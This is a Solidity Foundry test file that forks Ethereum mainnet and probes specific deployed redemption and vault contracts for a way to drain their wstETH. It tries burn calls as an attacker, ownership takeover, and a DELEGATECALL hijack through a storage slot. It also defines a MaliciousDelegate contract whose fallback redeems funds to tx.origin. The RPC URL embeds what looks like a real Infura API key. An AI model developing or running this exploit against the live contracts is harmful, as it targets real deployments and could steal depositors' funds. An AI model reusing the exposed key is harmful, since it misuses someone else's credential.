// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Test.sol";

interface IERC20 {
    function balanceOf(address) external view returns (uint256);
    function approve(address, uint256) external returns (bool);
    function transfer(address, uint256) external returns (bool);
}

contract BurnPathExploit is Test {
    address constant REDEMPTION_0 = 0xcd63a29FAfF07130d3Af89bB4f40778938AaBB85;
    address constant REDEMPTION_1 = 0x829525417Cd78CBa0f99A8736426fC299506C0d6;
    address constant REDEMPTION_CONTROLLER = 0xdF2eE409BEe416A53b5C040d8e6dAD4a7cEb2510;
    address constant VAULT = 0x551d155760ae96050439AD24Ae98A96c765d761B;
    address constant wstETH = 0x7f39C581F595B53c5cb19bD0b3f8dA6c935E2Ca0;
    address constant IAU = 0x1B6238E95bBCABEE58997c99BaDD4154ad68BA92;
    address constant TASSET = 0xD11c452fc99cF405034ee446803b6F6c1F6d5ED8;
    address constant TREASURY = 0xb6C71AaF9bf23D545FEF08a40f8a8aC95FBF9dAE;

    string RPC_URL = "https://mainnet.infura.io/v3/bfc7283659224dd6b5124ebbc2b14e2c";
    address attacker;

    function setUp() public {
        vm.createSelectFork(RPC_URL);
        attacker = makeAddr("attacker");
        vm.deal(attacker, 100 ether);
    }

    function test_AnalyzeBurnPath() public view {
        console.log("=== ANALYZING BURN PATH ===\n");

        // burn selector 0x42966c68 = burn(uint256)
        // It jumps to 3549/3567 which is near RC.redeem at 3627

        bytes memory code = REDEMPTION_1.code;

        // Detailed analysis from 3500-3700
        console.log("Bytecode 3500-3700:");

        uint i = 3500;
        while (i < 3700 && i < code.length) {
            uint8 op = uint8(code[i]);

            string memory opName = "";
            uint skipBytes = 0;

            if (op == 0x33) opName = "CALLER";
            else if (op == 0x54) opName = "SLOAD";
            else if (op == 0x55) opName = "SSTORE";
            else if (op == 0xf1) opName = "CALL";
            else if (op == 0xf4) opName = "DELEGATECALL";
            else if (op == 0x5b) opName = "JUMPDEST";
            else if (op == 0x56) opName = "JUMP";
            else if (op == 0x57) opName = "JUMPI";
            else if (op == 0xfd) opName = "REVERT";
            else if (op == 0x50) opName = "POP";
            else if (op == 0x20) opName = "SHA3";

            if (op >= 0x60 && op <= 0x7f) {
                uint8 size = op - 0x5f;
                uint256 val = 0;
                for (uint j = 0; j < size && i + 1 + j < code.length; j++) {
                    val = val << 8 | uint8(code[i + 1 + j]);
                }
                if (size == 4) {
                    console.log(i, "PUSH4:");
                    console.logBytes4(bytes4(uint32(val)));
                } else if (size == 20 && val > 1e30) {
                    console.log(i, "PUSH20 (mask)");
                } else if (val < 10000) {
                    console.log(i, "PUSH:", val);
                }
                skipBytes = size;
            } else if (bytes(opName).length > 0) {
                console.log(i, opName);
            }

            i += 1 + skipBytes;
        }
    }

    function test_TryBurnFunction() public {
        console.log("=== TRYING BURN FUNCTION ===\n");

        // burn(uint256) = 0x42966c68
        bytes4 burnSel = bytes4(keccak256("burn(uint256)"));
        console.log("burn(uint256) selector:");
        console.logBytes4(burnSel);

        uint256 vaultBefore = IERC20(wstETH).balanceOf(VAULT);
        console.log("Vault before:", vaultBefore / 1e18);

        // Give attacker TASSET tokens (tETH)
        deal(TASSET, attacker, 1000e18);
        console.log("Attacker TASSET:", IERC20(TASSET).balanceOf(attacker) / 1e18);

        vm.startPrank(attacker);

        // Approve REDEMPTION_1 to burn TASSET
        IERC20(TASSET).approve(REDEMPTION_1, type(uint256).max);

        console.log("\nCalling burn(100e18) on REDEMPTION_1:");
        (bool s1, bytes memory d1) = REDEMPTION_1.call(
            abi.encodeWithSelector(burnSel, 100e18)
        );
        console.log("Success:", s1);
        if (!s1 && d1.length >= 4) {
            console.log("Error:");
            console.logBytes4(bytes4(d1));
        }

        // Try burn(0) - might have different behavior
        console.log("\nCalling burn(0):");
        (bool s2, bytes memory d2) = REDEMPTION_1.call(
            abi.encodeWithSelector(burnSel, 0)
        );
        console.log("Success:", s2);

        // Try burn with very large amount
        console.log("\nCalling burn(type(uint256).max):");
        (bool s3, bytes memory d3) = REDEMPTION_1.call(
            abi.encodeWithSelector(burnSel, type(uint256).max)
        );
        console.log("Success:", s3);

        vm.stopPrank();

        uint256 vaultAfter = IERC20(wstETH).balanceOf(VAULT);
        uint256 attackerWstETH = IERC20(wstETH).balanceOf(attacker);

        console.log("\nResults:");
        console.log("Vault change:", int256(vaultAfter) - int256(vaultBefore));
        console.log("Attacker wstETH:", attackerWstETH / 1e18);

        if (attackerWstETH > 0) {
            console.log("\n*** BURN EXPLOIT SUCCESSFUL! ***");
        }
    }

    function test_TraceBurnToRCRedeem() public view {
        console.log("=== TRACING BURN TO RC.REDEEM ===\n");

        // The burn function jumps to 3549/3567
        // RC.redeem is at 3627 with CALL at some point after
        // Let's trace the path

        bytes memory code = REDEMPTION_1.code;

        // From 3549 to RC.redeem at 3627
        console.log("Detailed trace from burn entry (3549) to RC.redeem:");

        for (uint i = 3549; i < 3700 && i < code.length; i++) {
            uint8 op = uint8(code[i]);

            if (op == 0x5b) { // JUMPDEST
                console.log(i, "JUMPDEST");
            }
            if (op == 0x33) { // CALLER
                console.log(i, "CALLER");
            }
            if (op == 0x54) { // SLOAD
                console.log(i, "SLOAD");
            }
            if (op == 0x57) { // JUMPI
                // Look at condition before JUMPI
                console.log(i, "JUMPI");
            }
            if (op == 0x56) { // JUMP
                console.log(i, "JUMP");
            }
            if (op == 0x63) { // PUSH4
                bytes4 sel = bytes4(bytes.concat(code[i+1], code[i+2], code[i+3], code[i+4]));
                console.log(i, "PUSH4:");
                console.logBytes4(sel);
            }
            if (op == 0xf1) { // CALL
                console.log(i, "CALL");
            }
        }
    }

    function test_InvestigateDelegatecallSlot1() public {
        console.log("=== INVESTIGATING DELEGATECALL SLOT 1 ===\n");

        // DELEGATECALL at 1045 loads target from slot 1 (pendingOwner)
        // If pendingOwner is set, we might be able to hijack

        // Check current pendingOwner
        bytes32 slot1 = vm.load(REDEMPTION_1, bytes32(uint256(1)));
        console.log("Slot 1 (pendingOwner):");
        console.logBytes32(slot1);

        address pendingOwner = address(uint160(uint256(slot1)));
        console.log("As address:", pendingOwner);

        if (pendingOwner != address(0)) {
            console.log("*** PENDING OWNER IS SET! ***");

            // If we can become pendingOwner, we could hijack the delegatecall
            // and make it call RC.redeem!

            // Try acceptOwnership
            vm.startPrank(pendingOwner);
            (bool s1,) = REDEMPTION_1.call(
                abi.encodeWithSignature("acceptOwnership()")
            );
            console.log("acceptOwnership:", s1);
            vm.stopPrank();
        }

        // What selectors route to the DELEGATECALL at 1045?
        bytes memory code = REDEMPTION_1.code;

        console.log("\nFinding selectors that might use DELEGATECALL at 1045:");

        // The DELEGATECALL at 1045 is triggered by certain selectors
        // Let's find which ones by looking for PUSH2 targets near 1045

        for (uint i = 0; i < 1500 && i < code.length; i++) {
            if (uint8(code[i]) == 0x61) { // PUSH2
                uint16 target = uint16(uint8(code[i+1])) << 8 | uint8(code[i+2]);
                if (target >= 1000 && target <= 1100) {
                    // Look for nearby selector
                    for (uint j = (i > 100 ? i - 100 : 0); j < i; j++) {
                        if (uint8(code[j]) == 0x63) {
                            bytes4 sel = bytes4(bytes.concat(code[j+1], code[j+2], code[j+3], code[j+4]));
                            if (sel != bytes4(0) && sel != bytes4(0xffffffff) && uint32(sel) > 0x1000) {
                                console.log("Selector at", j, "may use DC at 1045:");
                                console.logBytes4(sel);
                            }
                        }
                    }
                }
            }
        }
    }

    function test_TryTransferOwnershipPath() public {
        console.log("=== TRYING TRANSFER OWNERSHIP PATH ===\n");

        // transferOwnership might set pendingOwner
        // Then if we call a function that triggers DELEGATECALL to slot 1...

        // First, try to set ourselves as pendingOwner
        vm.startPrank(attacker);

        console.log("Trying transferOwnership as attacker:");
        (bool s1, bytes memory d1) = REDEMPTION_1.call(
            abi.encodeWithSignature("transferOwnership(address)", attacker)
        );
        console.log("Success:", s1);
        if (!s1 && d1.length >= 4) {
            console.logBytes4(bytes4(d1));
        }

        vm.stopPrank();

        // Check who the owner is
        (bool s2, bytes memory d2) = REDEMPTION_1.staticcall(
            abi.encodeWithSignature("owner()")
        );
        if (s2) {
            address owner = abi.decode(d2, (address));
            console.log("Current owner:", owner);

            // Try as owner
            vm.startPrank(owner);
            console.log("\nTrying transferOwnership as owner:");
            (bool s3,) = REDEMPTION_1.call(
                abi.encodeWithSignature("transferOwnership(address)", attacker)
            );
            console.log("Success:", s3);
            vm.stopPrank();

            // Check pendingOwner
            bytes32 slot1 = vm.load(REDEMPTION_1, bytes32(uint256(1)));
            console.log("pendingOwner after:");
            console.logBytes32(slot1);
        }
    }

    function test_DeployMaliciousAndHijack() public {
        console.log("=== DEPLOY MALICIOUS AND HIJACK ===\n");

        // IF we could set pendingOwner to our malicious contract,
        // then trigger the DELEGATECALL at 1045,
        // our malicious contract could call RC.redeem!

        // Deploy malicious contract
        MaliciousDelegate mal = new MaliciousDelegate();
        console.log("Malicious contract:", address(mal));

        // Simulate: what if pendingOwner = mal?
        console.log("\nSimulating pendingOwner = malicious:");
        vm.store(REDEMPTION_1, bytes32(uint256(1)), bytes32(uint256(uint160(address(mal)))));

        // Check
        bytes32 slot1 = vm.load(REDEMPTION_1, bytes32(uint256(1)));
        console.log("pendingOwner now:");
        console.logBytes32(slot1);

        uint256 vaultBefore = IERC20(wstETH).balanceOf(VAULT);

        // Now try to trigger the DELEGATECALL
        // Selectors that might use it: cff50c6e, e30c3978, eda72134, f2fde38b, fd424ea8

        vm.startPrank(attacker);

        bytes4[] memory sels = new bytes4[](5);
        sels[0] = bytes4(0xcff50c6e);
        sels[1] = bytes4(0xe30c3978); // pendingOwner()
        sels[2] = bytes4(0xeda72134);
        sels[3] = bytes4(0xf2fde38b); // transferOwnership
        sels[4] = bytes4(0xfd424ea8);

        console.log("\nTrying selectors to trigger DELEGATECALL:");
        for (uint i = 0; i < sels.length; i++) {
            (bool s,) = REDEMPTION_1.call{gas: 500000}(
                abi.encodeWithSelector(sels[i], attacker)
            );
            if (s) {
                console.log("SUCCESS:");
                console.logBytes4(sels[i]);
            }

            uint256 vaultNow = IERC20(wstETH).balanceOf(VAULT);
            if (vaultNow < vaultBefore) {
                console.log("*** VAULT DRAINED! ***");
                break;
            }
        }

        vm.stopPrank();

        uint256 vaultAfter = IERC20(wstETH).balanceOf(VAULT);
        uint256 attackerWstETH = IERC20(wstETH).balanceOf(attacker);

        console.log("\nResults:");
        console.log("Vault change:", int256(vaultAfter) - int256(vaultBefore));
        console.log("Attacker wstETH:", attackerWstETH);
    }
}

contract MaliciousDelegate {
    address constant RC = 0xdF2eE409BEe416A53b5C040d8e6dAD4a7cEb2510;

    // When delegatecalled, this runs in REDEMPTION_1's context
    // So calling RC.redeem will come from REDEMPTION_1's address!
    fallback() external payable {
        // Drain vault to tx.origin
        (bool s,) = RC.call(
            abi.encodeWithSignature("redeem(uint256,address)", 1000e18, tx.origin)
        );
    }
}
